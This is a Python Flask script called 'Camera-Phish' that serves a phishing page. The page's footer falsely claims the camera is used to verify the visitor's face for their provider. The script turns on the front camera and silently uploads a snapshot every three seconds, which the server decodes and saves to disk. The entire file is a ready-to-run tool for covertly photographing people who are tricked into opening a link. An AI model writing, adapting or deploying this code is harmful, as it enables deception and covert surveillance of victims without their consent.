import os
import base64
from flask import Flask, render_template_string, request
from datetime import datetime

app = Flask(__name__)

# Directory to save images (Downloads/Camera-Phish)
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')

# Ensure the Camera-Phish folder exists
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

@app.route('/')
def index():
    return render_template_string('''
    <!doctype html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-color: black;
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            video {
                width: 90%;
                max-width: 480px;
                border: 2px solid #4caf50;
                border-radius: 10px;
            }
            footer {
                margin-top: 10px;
                font-size: 0.8em;
                text-align: center;
                color: #bbb;
            }
        </style>
    </head>
    <body>
        <div>
            <video id="video" playsinline autoplay></video>
        </div>
        <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
        <footer>
            <p>Disclaimer: To verify your face for your provider, the system captures images using your device's camera.</p>
        </footer>
        <script>
            function post(imgdata) {
                $.ajax({
                    type: 'POST',
                    data: { cat: imgdata },
                    url: '/post',
                    dataType: 'json',
                    async: false,
                    success: function(result) {
                        console.log("Image posted successfully");
                    },
                    error: function() {
                        console.error("Error posting image data.");
                    }
                });
            };

            'use strict';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            const constraints = {
                audio: false,
                video: { facingMode: "user" }  // Use the front camera
            };

            async function init() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    handleSuccess(stream);
                } catch (err) {
                    alert("Unable to access camera: " + err.message); // Alert the user
                }
            }

            // Success
            function handleSuccess(stream) {
                window.stream = stream;
                video.srcObject = stream;

                var context = canvas.getContext('2d');
                setInterval(function() {
                    context.drawImage(video, 0, 0, 640, 480);
                    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                    post(canvasData);
                }, 3000); // Automatically capture every 3 seconds
            }

            // Load init
            init();
        </script>
    </body>
    </html>
    ''')

@app.route('/post', methods=['POST'])
def post():
    image_data = request.form.get('cat')
    if image_data:
        # Process the image data
        date_str = datetime.now().strftime('%d%m%Y%H%M%S')
        image_data = image_data.split(",")[1]  # Get only the base64 part
        unencoded_data = base64.b64decode(image_data)  # Decode base64 data
        image_file = os.path.join(DOWNLOAD_FOLDER, f'face_{date_str}.png')

        # Save the image
        with open(image_file, 'wb') as f:
            f.write(unencoded_data)

        print(f"Image saved: {image_file}")
        return "Image saved!", 200

    return "No image data received.", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4543)  # Use port 4543

